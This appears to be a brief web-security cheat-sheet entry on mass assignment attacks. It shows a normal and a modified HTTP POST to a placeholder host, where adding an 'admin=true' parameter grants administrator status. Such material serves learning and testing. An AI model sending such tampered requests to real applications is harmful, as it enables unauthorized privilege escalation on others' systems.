# Mass Assignment Attack
## Introduction
Occurs when an app allows a user to manually add parameters in an HTTP Request & the app process value of these parameters when processing the HTTP Request & it affects the response that is returned to the user. Usually occurs in Ruby on Rails / NodeJS

## How to Exploit
- Normal request
```
POST /editdata
Host: vuln.com

username=daffa
```
```
HTTP/1.1 200 OK
...

username=daffa&admin=false
```

- Modified Request 
```
POST /editdata
Host: vuln.com

username=daffa&admin=true
```

```
HTTP/1.1 200 OK
...

username=daffa&admin=true
```